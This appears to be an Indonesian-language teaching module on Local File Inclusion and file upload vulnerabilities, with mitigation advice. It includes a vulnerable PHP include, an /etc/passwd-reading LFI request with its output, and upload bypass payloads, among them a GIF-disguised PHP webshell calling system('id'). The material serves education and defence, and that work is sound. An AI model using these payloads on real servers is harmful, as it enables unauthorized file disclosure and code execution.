# File Inclusion dan File Upload

## **&#9888;** Sebelum Lanjut Membaca .... 
Segala bentuk kegiatan **File Inclusion** atau **File Upload** tanpa ada persetujuan dan izin dari pemilik sistem/aplikasi merupakan **illegal**.

Materi yang dipaparkan dalam modul ini untuk keperluan edukasi/pembelajaran, sehingga tidak membenarkan segala aktivitas **illegal**.

## Definisi File Inclusion
Local File Inclusin (LFI) merupakan kerentanan pada aplikasi web, yang dimana kerentanan ini memungkinkan penyerang untuk `menyertakan`, `membaca` atau `mendownload` file lokal yang tersimpan pada server.

Kerentanan ini terjadi ketika aplikasi web menerima parameter file dari pengguna tanpa adanya validasi di parameter tersebut.

### Cara Kerja Local File Inclusion
Local File Inclusion memanipulasi parameter yang ada aplikasi web untuk mengekspos file sensitif yang terdapat pada server.

![lfi](https://miro.medium.com/v2/resize:fit:644/1*UPMlwBWgKMSUzSvY5mt5uw.png)

Berikut adalah contoh sebuah code yang rentan terhadap **Local File Inclusion**

```php
<?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);
} else {
    echo "Page not found.";
}
?>
```

Contoh eksploitasi pada kerentanan LFI:
```
# request parameter
http://localhost:3000/lfi.php?page=apcb.php

# response
Hello World!

# request parameter
http://localhost:3000/lfi.php?page=/etc/passwd

#response
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### Mitigasi pada Local File Inclusion
Untuk melakukan mitigasi pada kerentanan **Local File Inclusion** kita bisa menggunakan input validation atau sanitization.

Contoh kode yang telah menerapkan `whitelisting`:
```php
<?php
$whitelist = ['apcb.php', 'secret.txt'];

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    if (in_array($page, $whitelist)) {
        include($page);
    } else {
        echo "Page not found.";
    }
} else {
    echo "Page not found.";
}
?>
```

## Definisi File Upload
File Upload Vulnerability merupakan kerentanan yang dimana web server memperbolehkan user untuk mengunggah file tanpa adanya validasi seperti **nama file, tipe file, konten file,** dan **ukuran file**.

### Cara Kerja File Upload
File Upload terjadi karena pada web server tidak adanya pembatasan file yang akan diupload oleh user, disisi lain pihak developer merasa fiturnya aman yang sebenarnya dapat mudah untuk dilakukan **bypass**.

![file-upload](https://www.cobalt.io/hs-fs/hubfs/file-upload-vulnerabilities-example.png)

Contoh cara exploitasi pada kerentanan File Upload:

- Menggunakan double extension
```
file.jpg.php
```
- Menggunakan null byte
```
file.php%00.gif
```
- Manipulasi konten dengan `GIF89a;`
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="setya404.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
```

![chaining](https://pbs.twimg.com/media/F-FZQHabYAAqUhW.jpg:large)

### Mitigasi File Upload
1. Memperbolehkan spesifik tipe file
2. Melakukan verifikasi pada tipe file
3. Set panjang nama file dan besar ukuran file
4. Simpan file yang terupload diluar web folder

## Referensi
- [Understanding Local File Inclusion](https://brightsec.com/blog/local-file-inclusion-lfi/)
- [Understanding File Upload Vulnerability](https://cyberw1ng.medium.com/understanding-file-upload-vulnerabilities-in-web-app-penetration-testing-6de583fba63f)
- [Payload Local File Inclusion & Arbitary File Upload](https://github.com/daffainfo/AllAboutBugBounty/)